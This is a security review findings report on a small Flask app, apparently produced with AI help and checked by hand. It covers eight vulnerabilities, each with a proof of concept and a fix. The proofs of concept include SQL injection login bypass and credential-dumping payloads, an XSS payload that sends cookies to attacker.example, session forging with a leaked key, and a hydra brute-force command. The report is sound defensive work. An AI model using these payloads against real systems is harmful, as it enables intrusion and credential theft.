# AI Security Review: Findings Report

| Field | Value |
|-------|-------|
| Target | `app.py`, `templates/search.html` (branch `main`) |
| Reviewer | AI-assisted review (GitHub Copilot Chat / GPT-4 style prompt) + manual validation |
| Methodology | OWASP ASVS 4.0 L1, OWASP Top 10 2021, manual PoC reproduction |
| Scoring | CVSS v3.1 base score |
| Result | **8 findings**: 2 Critical, 3 High, 3 Medium |

## Prompt used

```text
Act as a senior application security engineer. Review the following Flask
application and Jinja2 template for security vulnerabilities. For each finding
return: title, CWE ID, OWASP Top 10 category, CVSS 3.1 vector and score, the
exact vulnerable code, a working proof-of-concept, and a recommended fix.
Do not report purely stylistic issues.
```

The AI flagged 7 of the 8 issues on the first pass. It **missed VULN-03** because the XSS sink is the `|safe` filter in `templates/search.html`, not in `app.py`. It was found after the template was added to the prompt context. This is a good example of why AI output must be validated by a human.

## Summary

| ID | Title | CWE | CVSS | Severity |
|----|-------|-----|------|----------|
| VULN-01 | SQL injection in login | CWE-89 | 9.8 | Critical |
| VULN-07 | Debug mode enabled | CWE-489 | 9.8 | Critical |
| VULN-02 | SQL injection in search | CWE-89 | 8.6 | High |
| VULN-05 | Hard-coded secret key | CWE-798 | 7.5 | High |
| VULN-06 | No rate limiting on login | CWE-307 | 7.5 | High |
| VULN-04 | IDOR on user profile | CWE-639 | 6.5 | Medium |
| VULN-03 | Reflected XSS in search | CWE-79 | 6.1 | Medium |
| VULN-08 | Missing security headers | CWE-693 | 4.3 | Medium |

---

## VULN-01: SQL injection in `/login` (Critical, 9.8)

- **CWE:** CWE-89 Improper Neutralization of Special Elements used in an SQL Command
- **CVSS:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8**
- **Description:** The username and password are concatenated directly into the SQL string. An attacker can change the query logic to bypass authentication and log in as any user, including `admin`.

```python
query = (
    "SELECT * FROM users WHERE username = '" + username +
    "' AND password = '" + password + "'"
)
user = conn.execute(query).fetchone()
```

**Proof of concept**
```bash
curl -i -X POST http://127.0.0.1:5000/login \
  -d "username=admin' --" -d "password=x"
# HTTP/1.1 302 FOUND  Location: /dashboard   <- logged in as admin
```
Resulting query: `SELECT * FROM users WHERE username = 'admin' --' AND password = 'x'`. The password check is commented out.

**Recommendation:** Use parameterised queries (`?` placeholders) and store passwords as salted hashes (bcrypt/argon2).

---

## VULN-02: SQL injection in `/search` (High, 8.6)

- **CWE:** CWE-89
- **CVSS:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` = **8.6**
- **Description:** The search term is inserted into a `LIKE` clause by string concatenation. A `UNION SELECT` can read any table, including plain-text passwords.

```python
query = "SELECT id, name, description, price FROM products WHERE name LIKE '%" + q + "%'"
```

**Proof of concept**
```bash
curl -G http://127.0.0.1:5000/search \
  --data-urlencode "q=' UNION SELECT id, username, password, email FROM users --"
# The results table lists every username and password
```

**Recommendation:** Use a parameterised query: `WHERE name LIKE ?` with `(f"%{q}%",)`. Do not show raw database errors to the user.

---

## VULN-03: Reflected XSS in `/search` (Medium, 6.1)

- **CWE:** CWE-79 Improper Neutralization of Input During Web Page Generation
- **CVSS:** `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` = **6.1**
- **Description:** The `q` parameter is rendered with Jinja2's `|safe` filter, which turns off auto-escaping. Injected script runs in the victim's browser. The session cookie can then be stolen, because no `HttpOnly`/CSP hardening is applied.

```html
<p>Results for: {{ query|safe }}</p>
```

**Proof of concept**
```
http://127.0.0.1:5000/search?q=<script>fetch('https://attacker.example/c?'+document.cookie)</script>
```

**Recommendation:** Remove `|safe` so Jinja2 auto-escaping applies. Add a strict Content-Security-Policy as defence in depth.

---

## VULN-04: IDOR in `/user/<id>` (Medium, 6.5)

- **CWE:** CWE-639 Authorization Bypass Through User-Controlled Key
- **CVSS:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = **6.5**
- **Description:** The route checks that a user is logged in, but not that the requested `user_id` belongs to them. Sequential integer IDs make enumeration trivial.

```python
user = conn.execute("SELECT ... FROM users WHERE id = ?", (user_id,)).fetchone()
return dict(user)   # no ownership check
```

**Proof of concept**
```bash
# Log in as bob (id 3), then request admin's record
curl -b cookies.txt http://127.0.0.1:5000/user/1
# {"account_balance": 99999.0, "role": "admin", "secret_note": "FLAG{idor_admin_note}", ...}
```

**Recommendation:** Enforce object-level authorisation: `if user_id != session["user_id"] and session["role"] != "admin": abort(403)`.

---

## VULN-05: Hard-coded secret key (High, 7.5)

- **CWE:** CWE-798 Use of Hard-coded Credentials
- **CVSS:** `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` = **7.5**
- **Description:** Flask signs session cookies with `SECRET_KEY`. Because the key is public in source control, an attacker can forge a session cookie for any user and role.

```python
app.config["SECRET_KEY"] = "supersecret123"
```

**Proof of concept**
```bash
pip install flask-unsign
flask-unsign --sign --cookie "{'user_id': 1, 'username': 'admin', 'role': 'admin'}" \
  --secret 'supersecret123'
# Paste the result as the "session" cookie -> you are admin
```

**Recommendation:** Load the key from an environment variable or secrets manager, refuse to start if it is missing, and rotate the exposed key.

---

## VULN-06: No rate limiting on `/login` (High, 7.5)

- **CWE:** CWE-307 Improper Restriction of Excessive Authentication Attempts
- **CVSS:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = **7.5**
- **Description:** Unlimited login attempts allow brute-force and credential-stuffing attacks.

**Proof of concept**
```bash
hydra -l alice -P rockyou.txt 127.0.0.1 -s 5000 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**Recommendation:** Add Flask-Limiter (e.g. `5 per minute` per IP on `/login`), log failed logins, and consider account lockout or MFA.

---

## VULN-07: Debug mode enabled (Critical, 9.8)

- **CWE:** CWE-489 Active Debug Code
- **CVSS:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8**
- **Description:** `debug=True` turns on the Werkzeug interactive debugger and detailed tracebacks. The app is also bound to `0.0.0.0`. If the debugger PIN is leaked or guessed, the debugger console gives arbitrary Python code execution on the server.

```python
app.run(host="0.0.0.0", port=5000, debug=True)
```

**Proof of concept:** Trigger any unhandled exception. The full traceback, file paths and source are shown, along with the debugger console.

**Recommendation:** Set `debug=False`, configure it via the environment, and run behind a production WSGI server such as gunicorn.

---

## VULN-08: Missing security headers (Medium, 4.3)

- **CWE:** CWE-693 Protection Mechanism Failure
- **CVSS:** `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N` = **4.3**
- **Description:** Responses have no `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security` or `Referrer-Policy`. This allows clickjacking and MIME sniffing, and removes defence in depth against XSS.

**Proof of concept**
```bash
curl -sI http://127.0.0.1:5000/ | grep -iE "content-security|x-frame|x-content-type|strict-transport"
# (no output)
```

**Recommendation:** Use Flask-Talisman to set a strict CSP, `frame-ancestors 'none'`, nosniff, HSTS and secure cookie flags.

---

## Additional observations (informational)
- Passwords are stored in plain text (CWE-256). Out of scope for the PR, but listed for the backlog.
- Session cookies lack `Secure` and `SameSite=Strict`. This is fixed as part of VULN-08.
- No CSRF protection on the login form (CWE-352). This is tracked for a follow-up PR.
